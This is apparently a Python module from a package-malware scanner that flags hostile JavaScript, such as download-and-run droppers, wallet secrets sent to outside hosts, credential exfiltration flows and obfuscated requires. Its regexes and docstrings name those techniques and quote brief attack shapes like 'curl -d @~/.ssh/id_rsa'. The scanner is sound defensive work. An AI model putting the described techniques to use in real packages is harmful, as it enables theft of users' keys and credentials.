"""Capabilities of JavaScript that the byte patterns cannot see, read from the code's structure.

A file fetched, written to disk and run; a wallet's secret handed to a request bound outside, directly
or one helper away; sensitive values followed to where they leave; names and modules reached through a
local decoder of character codes; an evaluator handed a long string. Each answers with capability hits
the composite reasoning combines like any other."""

from __future__ import annotations

import re
from typing import TYPE_CHECKING, ClassVar

from cordon_scanner.detect.code.capability.build_output import BuildOutput
from cordon_scanner.detect.code.capability.hits import CapabilityHit
from cordon_scanner.detect.code.wasm_glue import WasmBindgenGlue
from cordon_scanner.foundation.models import (
    Capability,
)

if TYPE_CHECKING:
    from cordon_scanner.foundation.content import FileContent


class JavaScriptCapabilities:
    """JavaScript capabilities resolved from the code's structure rather than its bytes."""

    JS_EVAL_MAX_BYTES: ClassVar[int] = 100_000

    #: What a file that computes its names contains; without one, there is nothing to evaluate.
    JS_EVAL_MARKERS: ClassVar[re.Pattern[str]] = re.compile(
        r"fromCharCode|Buffer\s*\.\s*from\s*\(|\batob\s*\(|\.\s*concat\s*\(|=\s*require\s*[;,\n]"
        r"|constructor\s*\.\s*_load|\\x[0-9a-fA-F]{2}|\[\s*\d{2,3}\s*,\s*\d{2,3}\s*,"
        r"|\bdns\s*\.\s*(?:promises\s*\.\s*)?(?:lookup|resolve)"
    )

    _JS_DOWNLOAD = re.compile(
        r"\b(?:https?\s{0,4}\.\s{0,4}(?:get|request)|fetch|axios(?:\s{0,4}\.\s{0,4}get)?|got|needle|"
        r"request\s{0,4}\.\s{0,4}get|download)\s{0,4}\("
    )

    _JS_WRITE = re.compile(
        r"\b(?:writeFileSync|writeFile|createWriteStream|appendFileSync|copyFileSync)\s{0,4}\("
    )

    _JS_SPAWN = re.compile(r"\b(?:execSync|exec|execFileSync|execFile|spawnSync|spawn)\s{0,4}\(")

    RUNS_A_FILE = re.compile(
        r"(?i)(?:^|[\s'\"`(,\[])(?:sh|bash|zsh|dash|powershell(?:\.exe)?|pwsh|cmd(?:\.exe)?\s{1,4}/c|"
        r"python[0-9.]{0,4}|perl|ruby|wscript|cscript|mshta)(?:[\s'\"`,\]]|$)"
        # `start` runs a file -- or opens a link in the browser: `start "" "${extUrl}"` is how an
        # extension opens a URL on Windows. Not when what it starts is a URL or names one.
        r"|(?:^|[\s'\"`(,\[])start(?:[\s'\"`,\]]|$)(?![^;\n]{0,60}(?:https?:|(?<!c)url\b|link|href))"
        r"|chmod\s{1,4}(?:\+x|[0-7]{3,4})|\.(?:exe|sh|bat|cmd|ps1|vbs|scr)\b"
    )

    _JS_ARGUMENT_WINDOW = 400

    @classmethod
    def js_downloaded_and_run(
        cls, content: FileContent, language: str | None
    ) -> list[CapabilityHit]:
        """A file fetched over the network, written to disk and run, in one JavaScript file.

        `http.get(url)` piped into `fs.createWriteStream("x.sh")`, then `exec("sh ./x.sh")`:
        nothing is decoded and nothing is piped into a shell on one line, so neither the
        fetch-and-execute patterns nor the decode composites see it -- and it is the commonest
        install-hook dropper in the npm dataset. What separates it from esbuild or a browser
        download at install is how the file is run: a package that fetches its own binary
        executes that binary; a dropper hands what it fetched to an interpreter, makes it
        executable, or starts a `.exe`, `.sh` or `.ps1`. Recorded at the process launch, as
        `fetch_exec`, so the composites judge it with the context they already use.
        """
        if language not in ("javascript", "typescript"):
            return []
        text = content.text
        if not cls._JS_DOWNLOAD.search(text) or not cls._JS_WRITE.search(text):
            return []
        for launch in cls._JS_SPAWN.finditer(text):
            window = text[launch.end() : launch.end() + cls._JS_ARGUMENT_WINDOW]
            arguments = window.split(";", 1)[0]
            if cls.RUNS_A_FILE.search(arguments) is None:
                continue
            start = len(text[: launch.start()].encode("utf-8"))
            line = text.count("\n", 0, launch.start()) + 1
            return [
                CapabilityHit(
                    capability=Capability.FETCH_EXEC,
                    rule_id="CAP.JS.DOWNLOAD_THEN_RUN",
                    byte_start=start,
                    byte_end=start + len(launch.group(0).encode("utf-8")),
                    line=line,
                )
            ]
        return []

    #: A request: `fetch(`, an `axios`/`got`/`needle`/`superagent`/`request` call, jQuery's.
    _JS_REQUEST: ClassVar[re.Pattern[str]] = re.compile(
        r"(?<![\w$.])(?:fetch|axios(?:\.\w{1,12})?|got(?:\.\w{1,12})?|needle(?:\.\w{1,12})?|"
        r"superagent(?:\.\w{1,12})?|request(?:\.\w{1,12})?|\$\.(?:post|ajax))\s{0,4}\("
    )

    _JS_EXTERNAL_URL: ClassVar[re.Pattern[str]] = re.compile(
        r"[\"'`]https?://(?!(?:localhost|127\.|0\.0\.0\.0|\[::1\]))[^\"'`\s/]{3,200}"
    )

    #: What a wallet is opened with. `seed` is a random seed as often as a wallet's, so it counts
    #: only in a file that is about wallets (`_JS_WALLET_CONTEXT`).
    _JS_WALLET_SECRET: ClassVar[re.Pattern[str]] = re.compile(
        r"(?<![\w$\"'`-])(?P<name>mnemonic(?:Phrase)?|seedPhrase|secretPhrase|privateKey|privKey|"
        r"private_key|secretKey|secret_key|walletSecret|seed)(?![\w$])(?!\s{0,4}[:(=])"
    )

    _JS_WALLET_CONTEXT: ClassVar[re.Pattern[str]] = re.compile(
        r"\b(?:[Ww]allet|mnemonic|[Kk]eypair|fromSeed|deriveKeypair|bip39|bip32|ethers|xrpl|solana|"
        r"web3)\b"
    )

    @classmethod
    def js_wallet_secret_sent(
        cls, content: FileContent, language: str | None
    ) -> list[CapabilityHit]:
        """A wallet's secret handed to a request bound for a fixed outside address.

        The compromised `xrpl` 4.2.1 (April 2025) did it in one call, on every wallet the library
        opened: `fetch("https://<host>/xc", { method: "POST", headers: { "ad-referral": seed } })`.
        A wallet library signs with the secret and sends what it signed; nothing it does needs the
        mnemonic or the private key itself to leave the process. The secret has to be a value in
        the request's arguments -- `{ seed: 1 }` names a field -- and the address a literal, not
        the node the user configured (review 98).
        """
        if language not in ("javascript", "typescript"):
            return []
        text = content.text
        if "http" not in text or cls._JS_WALLET_SECRET.search(text) is None:
            return []
        wallet_file = cls._JS_WALLET_CONTEXT.search(text) is not None
        for request in cls._JS_REQUEST.finditer(text):
            window = text[request.end() : request.end() + 600]
            call = window.split(";\n", 1)[0]
            if cls._JS_EXTERNAL_URL.match(call.lstrip()) is None:
                continue
            for secret in cls._JS_WALLET_SECRET.finditer(call):
                if secret.group("name") == "seed" and not wallet_file:
                    continue
                start = len(text[: request.start()].encode("utf-8"))
                return [
                    CapabilityHit(
                        capability=Capability.CREDENTIAL,
                        rule_id="CAP.JS.WALLET_SECRET_SENT",
                        byte_start=start,
                        byte_end=start + len(request.group(0).encode("utf-8")),
                        line=text.count("\n", 0, request.start()) + 1,
                    )
                ]
        if wallet_file:
            return cls.js_wallet_secret_through_helper(text)
        return []

    #: Both ends of a flow must be possible before the dataflow analysis is worth running.
    _JS_FLOW_SOURCE: ClassVar[re.Pattern[str]] = re.compile(
        r"process\.env|\bos\.|require\(\s*['\"](?:node:)?os['\"]|from\s+['\"](?:node:)?os['\"]|readFile|readdir"
        r"|createReadStream|privateKey|secretKey|mnemonic|seedPhrase|homedir|document\.cookie|localStorage"
        r"|clipboard"
    )

    _JS_FLOW_SINK: ClassVar[re.Pattern[str]] = re.compile(
        r"\bfetch\s*\(|axios|https?['\"]|\.request\s*\(|WebSocket|XMLHttpRequest|\bdns\b|child_process"
        r"|sendBeacon|node-fetch|undici|\bgot\b|superagent|needle|\bnet['\"]|\btls['\"]"
    )

    #: The other source: a response, which matters only where something can execute it.
    _JS_FLOW_EXECUTES: ClassVar[re.Pattern[str]] = re.compile(
        r"\beval\s*\(|\bFunction\s*\(|\bvm\b|child_process|\bexec(?:Sync)?\s*\(|\bspawn"
    )

    #: The flows reported, by source kind, and the sinks at which each is one. A secret leaves
    #: through a request, a connection, a lookup, a child process (`curl -d @~/.ssh/id_rsa`) or a
    #: link opened; the environment or the host name handed to a child process stays here; what a
    #: server sent is judged where it is executed, which an `open` (a browser) is not.
    _JS_SENDS: ClassVar[frozenset[str]] = frozenset({"request", "connection", "dns", "open"})

    JS_FLOW_RULES: ClassVar[tuple[tuple[str, str, frozenset[str]], ...]] = (
        ("secret_file", "CAP.JS.FLOW.SECRET_FILE_SENT", _JS_SENDS | {"process"}),
        ("wallet_key", "CAP.JS.FLOW.WALLET_KEY_SENT", _JS_SENDS | {"process"}),
        ("home_file", "CAP.JS.FLOW.HOME_FILE_SENT", _JS_SENDS | {"process"}),
        ("identity", "CAP.JS.FLOW.IDENTITY_SENT", _JS_SENDS),
        ("environment", "CAP.JS.FLOW.ENVIRONMENT_SENT", _JS_SENDS),
        ("network_response", "CAP.JS.FLOW.REMOTE_CODE", frozenset({"execute", "process"})),
        # A decoded blob reaching the same sinks: `Buffer.from(b64,"base64").toString()` split into
        # a command and run, or decoded into a module name and required (review 98 shape A,
        # rollup-plugins-polyfills-rode). The decoded label is followed through .split, array
        # destructuring and bindings by js_flow, so the pairing is a dataflow fact, not proximity.
        ("decoded", "CAP.JS.FLOW.REMOTE_CODE", frozenset({"execute", "process"})),
        # Sent over a raw socket or inside a DNS name rather than a request: what a command
        # printed, a home-directory file, a credential store. A client library speaks HTTP to its
        # service; a channel of its own is how a payload reports what it found.
        (
            "command_output",
            "CAP.JS.FLOW.COMMAND_OUTPUT_RAW",
            # Not `dns`: a lookup of the host a command printed (`npm config get registry`, the
            # connectivity check in `next`) uses the output as the destination, not as data.
            frozenset({"connection"}),
        ),
        ("home_file", "CAP.JS.FLOW.HOME_FILE_RAW", frozenset({"connection", "dns"})),
        ("secret_file", "CAP.JS.FLOW.SECRET_FILE_RAW", frozenset({"connection", "dns"})),
    )

    @staticmethod
    def js_string_code_run(content: FileContent, language: str | None) -> list[CapabilityHit]:
        """An evaluator handed a long string literal (`analysis/javascript/js_string_code.py`)."""
        from cordon_scanner.analysis.javascript.js_string_code import JsStringCode

        if language not in ("javascript", "typescript"):
            return []
        found = JsStringCode.first_run(content.text)
        if found is None:
            return []
        text, (begin, finish) = content.text, found
        start = len(text[:begin].encode("utf-8"))
        hit = CapabilityHit(
            capability=Capability.FLOW,
            rule_id="CAP.JS.STRING_CODE_RUN",
            byte_start=start,
            byte_end=start + len(text[begin:finish].encode("utf-8")),
            line=text.count("\n", 0, begin) + 1,
        )
        return [hit]

    @classmethod
    def js_flows(cls, content: FileContent, language: str | None) -> list[CapabilityHit]:
        """Sensitive values followed to where they leave, through bindings, helpers and callbacks
        (`detect/js_flow.py`) -- the same act as the proximity composites, without needing the
        read and the send to sit close. One hit per (rule, sink line); `detail` carries the
        destination's kind (drop, ip, fixed, unknown) and the sink's (request, connection, dns,
        process) for the composites to judge."""
        if language not in ("javascript", "typescript"):
            return []
        text = content.text
        if cls._JS_FLOW_SINK.search(text) is None or (
            cls._JS_FLOW_SOURCE.search(text) is None and cls._JS_FLOW_EXECUTES.search(text) is None
        ):
            # A request is a source too (`network_response`), judged where it is executed.
            return []
        from cordon_scanner.analysis.javascript.js_eval import JsEval
        from cordon_scanner.analysis.javascript.js_flow import JsFlow
        from cordon_scanner.analysis.javascript.js_fold import JsFold

        try:
            # Read where the evaluator writes out computed names and hosts; lines are kept.
            view = (
                JsEval.resolve(JsFold.fold(text))
                if len(text) <= cls.JS_EVAL_MAX_BYTES
                and cls.JS_EVAL_MARKERS.search(text)
                and not BuildOutput.bundled(content)
                else text
            )
            flows = JsFlow.flows(view)
            if view is not text:
                # The folded view writes a concatenation with an unknown part as a string with a
                # hole (`"https://h/" + q` -> `"https://h/_"`), so the value `q` carried is gone
                # from it. The view finds what folding reveals; the text as written keeps every
                # binding. Both are read (review 98, 17-PROOF-REVIEW).
                seen = {(f.line, f.sink, f.sources) for f in flows}
                flows += [f for f in JsFlow.flows(text) if (f.line, f.sink, f.sources) not in seen]
        except (IndexError, KeyError, ValueError, TypeError, RecursionError):
            return []  # read as written: every other rule still applies
        starts = [0]
        for index, char in enumerate(text):
            if char == "\n":
                starts.append(index + 1)
        hits: list[CapabilityHit] = []
        glue = WasmBindgenGlue.generated(text)
        for flow in flows:
            for kind, rule_id, sinks in cls.JS_FLOW_RULES:
                if kind not in flow.sources or flow.sink not in sinks:
                    continue
                offset = starts[min(flow.line, len(starts)) - 1]
                if (
                    glue
                    and rule_id == "CAP.JS.FLOW.REMOTE_CODE"
                    and WasmBindgenGlue.shim_at(text, offset)
                ):
                    continue  # the crate's own code, by its own module (`wasm_glue`)
                start = len(text[:offset].encode("utf-8"))
                hits.append(
                    CapabilityHit(
                        capability=Capability.FLOW,
                        rule_id=f"{rule_id}.{flow.destination.upper()}",
                        byte_start=start,
                        byte_end=start + 1,
                        line=flow.line,
                    )
                )
        return hits

    #: A one-parameter function or method: `static addToQueue(process) {`, `function q(k) {`,
    #: `const q = (k) => {`.
    _JS_ONE_PARAM_FUNCTION: ClassVar[re.Pattern[str]] = re.compile(
        r"(?:(?:static\s+|async\s+)?(?P<method>[A-Za-z_$][\w$]{0,60})\s*\(\s*(?P<p1>[A-Za-z_$][\w$]{0,40})\s*\)\s*\{"
        r"|function\s+(?P<fn>[A-Za-z_$][\w$]{0,60})\s*\(\s*(?P<p2>[A-Za-z_$][\w$]{0,40})\s*\)\s*\{"
        r"|(?:const|let|var)\s+(?P<arrow>[A-Za-z_$][\w$]{0,60})\s*=\s*(?:async\s*)?\(?\s*(?P<p3>[A-Za-z_$][\w$]{0,40})\s*\)?\s*=>\s*\{)"
    )

    @classmethod
    def js_wallet_secret_through_helper(cls, text: str) -> list[CapabilityHit]:
        """The same, one call away: the wallet hands its key to a helper, and the helper puts
        what it was given -- or a value made from it -- into a request to a fixed outside address.

        The compromised `@solana/web3.js` 1.95.7 (December 2024): every `Keypair` constructor
        called `Loader.addToQueue(this._secretKey)`, and `addToQueue(process)` base58-encoded its
        argument into the headers of a `fetch` to an outside host. Read one call at a time,
        neither half says it: the constructor sends nothing and the helper names no secret.
        """
        for found in cls._JS_ONE_PARAM_FUNCTION.finditer(text):
            name = found.group("method") or found.group("fn") or found.group("arrow")
            param = found.group("p1") or found.group("p2") or found.group("p3")
            if name in ("if", "for", "while", "switch", "catch", "function", "return"):
                continue
            body = text[found.end() : found.end() + 2000]
            depth, end = 1, len(body)
            for index, char in enumerate(body):
                depth += char == "{"
                depth -= char == "}"
                if depth == 0:
                    end = index
                    break
            body = body[:end]
            request = cls._JS_REQUEST.search(body)
            if request is None:
                continue
            call = body[request.end() : request.end() + 600]
            if cls._JS_EXTERNAL_URL.match(call.lstrip()) is None:
                continue
            # The parameter, and names assigned from it before the request.
            carried = {param} | {
                m.group(1)
                for m in re.finditer(
                    r"(?:const|let|var)\s+([A-Za-z_$][\w$]{0,40})\s*=\s*[^;\n]{0,200}?(?<![\w$])"
                    + re.escape(param)
                    + r"(?![\w$])",
                    body[: request.start()],
                )
            }
            if not any(
                re.search(rf"(?<![\w$.\"'`]){re.escape(n)}(?![\w$])", call) for n in carried
            ):
                continue
            caller = re.search(
                rf"(?<![\w$])(?:[\w$]+\.)?{re.escape(name)}\s*\(\s*(?:this\.)?_?(?:secretKey|privateKey|"
                rf"privKey|secret_key|private_key|mnemonic|seedPhrase|secretPhrase)\s*\)",
                text,
            )
            if caller is None:
                continue
            start = len(text[: caller.start()].encode("utf-8"))
            return [
                CapabilityHit(
                    capability=Capability.CREDENTIAL,
                    rule_id="CAP.JS.WALLET_SECRET_SENT",
                    byte_start=start,
                    byte_end=start + len(caller.group(0).encode("utf-8")),
                    line=text.count("\n", 0, caller.start()) + 1,
                )
            ]
        return []

    _JS_REQUIRE_CALL: ClassVar[re.Pattern[str]] = re.compile(
        r"(?<![\w$.])require\s{0,4}\(\s{0,4}(?P<decoder>[A-Za-z_$][\w$]{0,40})\s{0,4}\("
    )

    #: Helpers that legitimately compute what to load: a path, a resolver, a plugin finder.
    _JS_LOADER_HELPER: ClassVar[re.Pattern[str]] = re.compile(
        r"(?i)path|join|resolve|dir|file|module|plugin|config|load|locate|find|require|import|get"
    )

    _JS_DECODER_CALLS: ClassVar[int] = 10

    #: A module name decoded from a literal on the spot: hex, base64, char codes or a byte array.
    _JS_DECODED_REQUIRE: ClassVar[re.Pattern[str]] = re.compile(
        r"(?<![\w$.])(?:require|import)\s{0,4}\(\s{0,24}(?:"
        r"Buffer\s{0,4}\.\s{0,4}from\s{0,4}\(\s{0,4}(?:[\"'][A-Za-z0-9+/=]{2,200}[\"']\s{0,4},\s{0,4}"
        r"[\"'](?:hex|base64|base64url)[\"']|\[[\d\s,x]{1,400}\])\s{0,4}\)\s{0,4}\.\s{0,4}toString"
        r"|atob\s{0,4}\(\s{0,4}[\"'][A-Za-z0-9+/=]{2,200}[\"']"
        r"|String\s{0,4}\.\s{0,4}fromCharCode\s{0,4}\("
        r")"
    )

    _JS_CODE_ARRAY_CALL: ClassVar[re.Pattern[str]] = re.compile(
        r"(?<![\w$.])(?P<decoder>[A-Za-z_$][\w$]{0,20})\(\s{0,4}\[\s{0,4}\d{2,3}(?:\s{0,4},\s{0,4}\d{2,3}){1,60}\s{0,4}\]\s{0,4}\)"
    )

    @classmethod
    def js_spelled_names(cls, content: FileContent, language: str | None) -> list[CapabilityHit]:
        """Names reached through a local decoder of character codes, four times or more.

        `global[d([112,114,111,99,101,115,115])]`, `module.constructor[d([95,108,111,97,100])]`:
        when the module loader, the module and the call are all spelled as codes, no name the
        other rules read is left (review 98, dax-styles). One decoded string is a constant; a
        file that reaches four things this way is hiding what it reaches.
        """
        if (
            language not in ("javascript", "typescript")
            or "fromCharCode" not in content.text
            or BuildOutput.bundled(content)
        ):
            return []
        counts: dict[str, list[re.Match[str]]] = {}
        for match in cls._JS_CODE_ARRAY_CALL.finditer(content.text):
            counts.setdefault(match.group("decoder"), []).append(match)
        for decoder, calls in counts.items():
            if decoder in ("fromCharCode", "Array", "Uint8Array", "Buffer") or len(calls) < 4:
                continue
            first = calls[0]
            start = len(content.text[: first.start()].encode("utf-8"))
            return [
                CapabilityHit(
                    capability=Capability.DYNAMIC_DISPATCH,
                    rule_id="CAP.JS.SPELLED_NAMES",
                    byte_start=start,
                    byte_end=start + len(first.group(0).encode("utf-8")),
                    line=content.text.count("\n", 0, first.start()) + 1,
                )
            ]
        return []

    @classmethod
    def js_computed_require(cls, content: FileContent, language: str | None) -> list[CapabilityHit]:
        """Modules required by names a local decoder produces: `require(_d([...]))`.

        A string-array obfuscator hides every module name, so `require("https")` -- the egress
        the composites need -- is never written. What is left is the shape: `require` handed the
        result of a local function that the file calls many times. `@sbxapps/...` (2026) reads
        cloud, SSH and npm credentials from its `preinstall` this way, with nine computed
        requires through one decoder called 217 times (review 98). Recorded as
        `dynamic_dispatch`, so the install-hook composite decides what it means; a path or a
        plugin resolver (`require(path.join(...))`) is not a decoder.
        """
        if language not in ("javascript", "typescript"):
            return []
        text = content.text
        if "require" not in text and "import" not in text:
            return []
        # The same disguise without a decoder function: `require(Buffer.from("6f73",
        # "hex").toString())` loads `os` under a name nobody reads. No package hides which module
        # it loads; a campaign of 28 releases ran its collector from `postinstall` this way, each
        # module name in hex (review 98). One is enough: there is no benign reading of it.
        decoded = cls._JS_DECODED_REQUIRE.search(text)
        if decoded is not None:
            start = len(text[: decoded.start()].encode("utf-8"))
            return [
                CapabilityHit(
                    capability=Capability.DYNAMIC_DISPATCH,
                    rule_id="CAP.JS.COMPUTED_REQUIRE",
                    byte_start=start,
                    byte_end=start + len(decoded.group(0).encode("utf-8")),
                    line=text.count("\n", 0, decoded.start()) + 1,
                )
            ]
        if "require" not in text:
            return []
        # `require` under another name first: `const _r = require; _r(_d("6f73"))` (review 98:
        # a preinstall's helper loading os, dns and https through a hex decoder and an alias).
        # Not in a bundle: a bundler aliases `require` as routinely as it renames everything else.
        bundled = re.search(
            r"(?:^|/)(?:dist|out|build|bundle|webpack)/|\.(?:min|bundle)\.[cm]?js$|\.vsix!",
            content.path.rpartition("!")[2] if ".vsix!" not in content.path else content.path,
        )
        aliases = (
            []
            if bundled or len(text) > 100_000
            else [
                m.group(1)
                for m in re.finditer(
                    r"(?:const|let|var)\s{1,4}([A-Za-z_$][\w$]{0,40})\s{0,4}=\s{0,4}require\s{0,4}[;,\n]",
                    text,
                )
            ]
        )
        calls = list(cls._JS_REQUIRE_CALL.finditer(text))
        for alias in aliases:
            calls += list(
                re.finditer(
                    rf"(?<![\w$.]){re.escape(alias)}\s{{0,4}}\(\s{{0,4}}(?P<decoder>[A-Za-z_$][\w$]{{0,40}})\s{{0,4}}\(",
                    text,
                )
            )
        for match in calls:
            decoder = match.group("decoder")
            if cls._JS_LOADER_HELPER.search(decoder):
                continue
            uses = len(re.findall(rf"(?<![\w$.]){re.escape(decoder)}\s{{0,4}}\(", text))
            if uses < cls._JS_DECODER_CALLS:
                continue
            start = len(text[: match.start()].encode("utf-8"))
            return [
                CapabilityHit(
                    capability=Capability.DYNAMIC_DISPATCH,
                    rule_id="CAP.JS.COMPUTED_REQUIRE",
                    byte_start=start,
                    byte_end=start + len(match.group(0).encode("utf-8")),
                    line=text.count("\n", 0, match.start()) + 1,
                )
            ]
        return []


__all__ = ["JavaScriptCapabilities"]
